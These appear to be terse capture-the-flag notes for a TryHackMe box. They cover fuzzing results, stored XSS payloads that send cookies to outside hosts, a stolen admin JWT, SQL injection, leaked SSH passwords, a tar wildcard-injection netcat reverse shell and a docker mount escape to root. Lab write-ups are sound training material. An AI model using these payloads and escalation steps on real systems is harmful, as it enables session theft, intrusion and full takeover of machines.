start with nmap

80
22
32768

***

http 80

fuzz :

```
admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
Admin                   [Status: 403, Size: 392, Words: 75, Lines: 22]
ADMIN                   [Status: 403, Size: 392, Words: 75, Lines: 22]
images                  [Status: 301, Size: 179, Words: 7, Lines: 11]
login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
Login                   [Status: 200, Size: 857, Words: 200, Lines: 36]
messages                [Status: 302, Size: 28, Words: 4, Lines: 1]
new                     [Status: 302, Size: 28, Words: 4, Lines: 1]
robots.txt              [Status: 200, Size: 31, Words: 3, Lines: 3]
signup                  [Status: 200, Size: 667, Words: 159, Lines: 31]
stylesheets             [Status: 301, Size: 189, Words: 7, Lines: 11]

```

/admin can't access by us.

test cookies for sql injection

we can send message to admin.

create two account. try to send message from 1 to 2 and try to get xss. if success try to get admin cookies.


<script type=“text/javascript”>document.location=“http://10.17.9.112:5000/?c=“+document.cookie;</script>


<script>document.location="http://8fd4fb80f503625de29ffe2a8d3599e6.log.tryhackme.tech/?c="+document.cookie;</script>
***

play jwt token

***

<script>var i=new Image;i.src="http://b43f563553f3443c7e830d9958991858.log.tryhackme.tech/?"+document.cookie;</script>

using this got admin cokies :

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2NDE0NTQ1MzB9.V1dio8OwHQub3viPFqaPaKzc_OY6HKXPFqQgQ6OSD4o

```

login into admin account using cookies.

***

found slq injection at `http://10.10.254.160/admin?user=2%27`

sql injection : found some hashesh but in message table found creds.

user : jake
michael
system

ssh pass : @b_ENXkGYUCAv3zJ

jake : @b_ENXkGYUCAv3zJ


***

privs 

jake can run sudo as michael :

`(michael) NOPASSWD: /opt/backups/backup.sh`


```
echo "mkfifo /tmp/lhennp; nc 10.11.57.82 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh

echo "" > "--checkpoint-action=exec=sh shell.sh"

echo "" > --checkpoint=1

```


***

startup.sh found in /home/marketplace

```
cd /home/marketplace/the-marketplace; docker-compose up -d; done


```

docker is used. tried to break out basic retriction using 

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh` --> from gtfobins

got root shell.